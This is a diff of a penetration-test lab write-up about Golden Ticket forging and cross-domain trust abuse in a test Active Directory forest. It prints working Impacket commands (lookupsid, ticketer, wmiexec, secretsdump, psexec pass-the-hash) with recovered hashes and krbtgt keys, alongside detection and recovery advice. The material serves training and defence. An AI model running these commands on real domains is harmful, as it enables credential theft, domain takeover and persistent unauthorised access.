@@ -1,12 +1,37 @@
-# 5. Golden Ticket
+# Golden Ticket and Cross-Domain Trust Abuse
 
-## Finding SID
+## Objective
 
-`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.22`
+This phase tested whether the `krbtgt` material recovered from the child domain could be used to forge a valid **Kerberos Ticket-Granting Ticket (TGT)**, maintain domain access, and evaluate the potential impact of the trust relationship with the parent domain.
 
-**Result:**
+## Starting position
 
+- Domain Admin level access in `north.sevenkingdoms.local`
+- The child-domain SID
+- The child-domain `krbtgt` key material
+- Knowledge of the parent domain and its SID
+
+## Why `krbtgt` compromise matters
+
+The `krbtgt` account is used by the **Key Distribution Center** to protect Kerberos TGTs.
+
+Access to its cryptographic key allows an attacker to create tickets tha tappear to have been issued by the domain.
+
+This is different from compromising one administrator password. 
+
+A forged ticket can be generted for an arbitrary username and group membership and may continue to work until the `krbtgt` keys are rotated correctly!
+
+## Required domain informaiton
+
+Impacket's `lookupsid.py` was used to confirm the relevant SIDs.
+
+```bash
+lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.22
 ```
+
+The result is:
+
+```bash
 [*] Brute forcing SIDs at 10.4.10.22
 [*] StringBinding ncacn_np:10.4.10.22[\pipe\lsarpc]
 [*] Domain SID is: S-1-5-21-3779674392-1109536343-705869415
@@ -19,15 +44,16 @@
 1001: CASTELBLACK\SQLServer2005SQLBrowserUser$CASTELBLACK (SidTypeAlias)
 ```
 
----------------
+The domain SID and target group RIDs are needed for the ticket analysis.
 
-**Child Domain SID:**
+### Child Domain SID
 
-`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.11`
-
-**Result:**
-
+```bash
+lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.11
 ```
+
+Result:
+```bash
 [*] Domain SID is: S-1-5-21-58534182-3680670537-1634125476
 500: NORTH\Administrator (SidTypeUser)
 501: NORTH\Guest (SidTypeUser)
@@ -70,11 +96,12 @@
 1121: NORTH\sql_svc (SidTypeUser)
 ```
 
-**Parent Domain SID:**
+### Parent Domain SID
 
-`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.10`
+```bash
+lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.10
 
-```
+# Result
 498: SEVENKINGDOMS\Enterprise Read-only Domain Controllers (SidTypeGroup)
 500: SEVENKINGDOMS\Administrator (SidTypeUser)
 501: SEVENKINGDOMS\Guest (SidTypeUser)
@@ -122,62 +149,92 @@
 1123: SEVENKINGDOMS\maester.pycelle (SidTypeUser)
 ```
 
-**So, the SIDs are:** 
+So, now the required values are:
+```text
+Child-domain SID "NORTH_DOMAIN_SID": S-1-5-21-58534182-3680670537-1634125476
 
-**Child Domain:** `S-1-5-21-58534182-3680670537-1634125476`
-**Parent Domain:** `S-1-5-21-3848810514-1890589760-83533814`
-**krbtgt hash:** `34b24f1a67d914d8ef876f8bd02f3f0b`
-**krbtgt aes:** `badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580`
+Parent-domain SID: "SEVENKINGDOMS_DOMAIN_SID": S-1-5-21-3848810514-1890589760-83533814
 
+KRBTGT hash: 34b24f1a67d914d8ef876f8bd02f3f0b
 
-`ticketer.py -nthash 34b24f1a67d914d8ef876f8bd02f3f0b -domain-sid S-1-5-21-58534182-3680670537-1634125476 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-3848810514-1890589760-83533814 goldenuser`
-
-```
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
-
-[*] Creating basic skeleton ticket and PAC Infos
-/home/kali/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  aTime = timegm(datetime.datetime.utcnow().timetuple())
-[*] Customizing ticket for north.sevenkingdoms.local/goldenuser
-/home/kali/.local/bin/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
-/home/kali/.local/bin/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
-/home/kali/.local/bin/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
-[*] 	PAC_LOGON_INFO
-[*] 	PAC_CLIENT_INFO_TYPE
-[*] 	EncTicketPart
-/home/kali/.local/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
-[*] 	EncAsRepPart
-[*] Signing/Encrypting final ticket
-[*] 	PAC_SERVER_CHECKSUM
-[*] 	PAC_PRIVSVR_CHECKSUM
-[*] 	EncTicketPart
-[*] 	EncASRepPart
-[*] Saving ticket in goldenuser.ccache
+KRBTGT AES: badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580
 ```
 
+## Validated child-domain Golden Ticket
 
+A Golden Ticket was generated for an existing child-domain accoutn with a valid RID:
 
-Parent domain NTDS
-`secretsdump -k -no-pass -just-dc-ntlm north.sevenkingdoms.local/goldenuser@kingslanding.sevenkingdoms.local   `
+```bash
+ticketer.py -aesKey badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580 -domain-sid S-1-5-21-58534182-3680670537-1634125476 -extra-pac -domain north.sevenkingdoms.local -user-id 1111 eddard.stark
+```
 
-**Working Golden Ticket**
-`ticketer.py -aesKey badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580 -domain-sid S-1-5-21-58534182-3680670537-1634125476 -extra-pac -domain north.sevenkingdoms.local -user-id 1111 eddard.stark`
+The resulting credential cache was loaded:
 
-`export KRB5CCNAME=/home/kali/eddard.stark.ccache`
+```bash
+export KRB5CCNAME=/home/kali/eddard.stark.ccache
+```
 
-`wmiexec.py -k -no-pass north.sevenkingdoms.local/eddard.stark@winterfell.north.sevenkingdoms.local`
+Kerberos authentication was then validated against `WINTERFELL`:
 
-**GOLDEN TICKET MIMIKATZ**
-**Upload Mimikatz to target**
+```bash
+wmiexec.py -k -no-pass north.sevenkingdoms.local/eddard.stark@winterfell.north.sevenkingdoms.local
+```
 
-Use smbvclient to pass the hash with Robb.Stark and upload the mimikatz file.
+## Related cross-domain compromise
 
-`smbclient.py -hashes :831486ac7f26860c9e2f51ac91e1a07a NORTH/robb.stark@10.4.10.22`
+A separate cross-domain compromise was later validated through **unconstrained delegation**, where a parent-domain controller's TGT was captured and used to extract parent-domain credentials.
 
-Logn in with PSEXEC and pass-the-hash:
+That path is documented in [Kerberos delegation](07-kerberos-delegation.md) and should not be confused with the unvalidated cross-domain Golden Ticket.
 
-`psexec.py north.sevenkingdoms.local/eddard.stark@10.4.10.22 -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8`
+## Result
+
+The assessment confirmed that:
+
+- The child-domain `krbtgt` material was compromised
+- A forged child-domain TGT could be generated and used successfully
+- The parent-domain trust relationship created a potential escalation path
+- Creation and usage of the Golden Ticket made it possible to maintain access
+
+## Security Impact
+
+A validated Golden Ticket provides domain-level persistence that is independent of the compromised user's current password. 
+
+Ordinary password resets do not remove the attacker's ability to forge new tickets while the `krbtgt` key remains valid.
+
+If SID filtering and trust protections allow privileged extra SIDs to cross a trust boundary, the impact can extend beyond the child domain into the parent forest.
+
+## Detection opportunities
+
+Golden Tickets can be difficult to identify solely from one event. Useful signals include:
+
+- Kerberos tickets with unusual lifetimes or encryption characteristics
+- Ticket use for usernames that do not exist or are disabled
+- Privileged access without a corresponding normal authentication sequence
+- Mismatches between account attributes and group membership represented in the ticket
+- Service-ticket activity from systems or accoutns that do not normally request it
+- Evidence of prior access to domain-controller credential material
+
+## Containment and recovery
+
+If `krbtgt` material is exposed:
+
+1. Treat the domain as compromised and investigate how domain-controller credential access occurred
+2. Rotate other exposed privileged credentials
+3. Reset the `krbtgt` password twice, allowing domain replication to complete between resets
+4. Review trust relationships, SID filtering, and privileged cross-domain group membership
+5. Hunt for forged-ticket activity and persistence on systems accessed during the compromise
+6. Restrict where privileged accounts may log on to reduce future credential exposure
+
+## MITRE ATT&CK mapping
+
+- `T1558.001` - Golden Ticket
+- `T1550.003` - Pass the Ticket
+- `T1134.005` - SID-History Injection / Extra SID abuse context
+
+## Key takeaway
+
+The child-domain Golden Ticket was a confirmed result and demonstrates why `krbtgt` compromise is a domain-recovery event.
+
+## Navigation
+
+[Previous: Privilege escalation and domain compromise](04-privilege-escalation-and-domain-compromise.md) | [Assessment index](../README.md) | [Next: Active Directory Certificate Services](06-adcs/README.md)
